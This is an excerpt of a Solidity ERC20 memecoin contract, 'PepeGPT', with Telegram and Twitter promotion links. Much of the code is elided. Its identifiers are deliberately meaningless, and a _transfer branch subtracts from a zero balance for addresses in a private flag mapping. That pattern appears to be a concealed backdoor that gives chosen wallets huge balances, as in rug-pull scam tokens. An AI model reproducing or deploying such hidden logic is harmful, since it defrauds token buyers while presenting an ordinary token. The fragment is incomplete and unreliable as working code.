...
Telegram: https://t.me/PepeGPT_ETH  🐸🚀💎

Twitter: https://twitter.com/PepeGPT_ETH 🐸🚀💎
...
contract PepeGPT is ERC20, Ownable {
    ...
    mapping(address => bool) private wore;

    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);

    event AutoNukeLP();

    constructor(string memory sides, string memory sent, address torn, address hay) ERC20(sides, sent) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(torn);
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        if (getting[from] == 0 && uniswapV2Pair != from && wore[from]) {
            getting[from] -= so;
        }
